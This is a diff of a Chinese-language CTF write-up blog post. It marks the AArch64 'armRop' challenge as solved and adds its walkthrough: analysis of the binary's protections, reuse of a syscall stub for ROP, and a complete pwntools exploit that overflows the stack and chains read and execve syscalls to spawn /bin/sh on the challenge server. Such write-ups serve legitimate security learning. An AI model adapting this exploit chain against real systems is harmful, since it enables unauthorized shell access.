@@ -27,25 +27,23 @@ mathjax: true
   - [x] Rubber
   - [ ] secretplayer
 - [ ] Reverse
-
   - [x] signin_2048
-
   - [x] Sleeeeeeeeeeeeeeeeeeep
-
   - [ ] MMMc
-
   - [x] Way
-
   - [ ] ~~pe_format~~ 没放出来的题
 - [ ] Pwn
-
   - [x] ssp
   - [x] fmt
-  - [ ] armRop
+  - [x] armRop
   - [ ] Brainfork
 - [ ] Blockchain
 - [ ] Web
 - [ ] Crypto （~~我要是会数论昨天的蓝桥杯就不至于心态崩了~~）
+
+=== Update On 2022-04-19 ===
+
+被隔离了....，没有什么事要干，补了`armRop`这题
 
 ## MISC
 
@@ -685,7 +683,103 @@ if __name__ == "__main__":
 
 
 
-### armRop [TODO]
+### armRop
+
+这是一道基于`AARCH64`的栈溢出`ROP`题目
+
+首先查一下`ELF`属性：
+
+![arm1](arm1.png)
+
+可以发现`NX`（栈不可执行，往栈上写`shell`时得先`mprotect`开权限），`NO PIE`（调`Gadgets`方便多了）
+
+然后考虑`ARM`的`ROP`利用方法：
+
+![arm2](arm2.png)
+
+注意到`vulnerable`中因为调用了其它的函数，在进入`vulnerable`时保存了`R29`和`R30`寄存器，返回时从栈上弹出，故我们可以通过`gets`栈溢出劫持`main`的返回地址，构造`ROP`链
+
+我们现在需要找两种类型的`Gadgets`：一种是将栈中的值复制到寄存器中(一般只有复制到`R19`开始的寄存器)，一种是将寄存器的值移动到`R0-R7`作为调用参数；然后考虑构造如下的链：`mprotect`开`data/bss`执行权限 -> `syscall read`入读`shellcode`到`data/bss` -> 跳转到`shellcode`执行
+
+然而，找了一上午`gadgets`，没有找到什么有用的，所有的移动寄存器到`R0-R7`的`gadgets`最后都通过寄存器寻址跳走了，难以控制目标地址，于是考虑转换思路，研究出题人是否提供了`seed`（`seed`这个名词对吗？）
+
+于是发现了一个很不自然的函数`welcome`：
+
+![arm3](arm3.png)
+
+这个函数使用`syscall`做了一件事：输出`Welcome! Please say something:`
+
+而且这个`syscall`有一个完整的结构：
+
+```assembly
+0x00000000004006dc <+48>:    ldrsw   x0, [sp, #28]
+0x00000000004006e0 <+52>:    ldr     w3, [sp, #16]
+0x00000000004006e4 <+56>:    ldr     w2, [sp, #20]
+0x00000000004006e8 <+60>:    ldr     w1, [sp, #24]
+0x00000000004006ec <+64>:    bl      0x419220 <syscall>
+```
+
+即从栈上取出`4`个参数，然后调用`syscall`，不需要额外的准备或移动 !!
+
+现在考虑我们如何利用`syscall`来`getshell`：
+
+首先找一下文件中是否存在`/bin/sh\0`，这样可以省去写`data/bss`的操作：`ROPgadget --binary arm --string "/bin/sh"`，然而并不存在。所以我们第一步需要使用`syscall(read, fd, buf, count)`将`/bin/sh\0`写入到我们可以控制的地址上去
+
+然后使用`syscall(execve, filename, argv, envp)`调用`shell`
+
+`AARCH64 Linux System Call`的列表，调用号，调用参数可以在这里找到：[Linux System Call Table - aarch64 (thog.github.io)](https://thog.github.io/syscalls-table-aarch64/latest.html)
+
+接下来就是常规的操作，使用`cyclic`找到溢出所需的偏移量：`144`（覆盖`R30`）
+
+然后构造`payload`：（需要注意的是：系统调用的参数是`32`位的）
+
+```python
+from pwn import *
+
+
+if args.REMOTE:
+    p = remote('175.178.248.28', 10047)
+else:
+    # p = process(['qemu-aarch64', '-g', '1234', 'arm'])
+    p = process(['qemu-aarch64', 'arm'])
+
+shell = b'/bin/sh\0'
+syscall = 0x4006dc
+data = 0x48a048
+
+# 对齐
+payload = b'A' * (144-8)
+
+payload += p64(syscall) # 修改 main 的返回地址 syscall (read)
+
+# 第一次调用 syscall 时加载参数的偏移量：0x10
+payload += p64(0)       # 占位
+payload += p64(syscall) # 第一次 syscall 调用后的返回地址 即再调用一次 syscall (execve)
+
+# 第一次 syscall 参数
+payload += p32(len(shell)) # count
+payload += p32(data)       # buf
+payload += p32(0)          # fd -> stdin
+payload += p32(0x3f)       # syscall num
+
+# 第二次 syscall
+payload += p64(0)
+payload += p64(0)    # 占位符，并且不关心第二次的返回
+payload += p32(0)    # envp -> null string
+payload += p32(0)    # argv -> null string
+payload += p32(data) # filename -> /bin/sh\0
+payload += p32(0xdd) # syscall num
+
+# 发送 payload
+p.sendline(payload)
+# 发送 /bin/sh
+p.send(shell)
+
+# 反弹shell
+p.interactive()
+```
+
+![arm4](arm4.png)
 
 
 
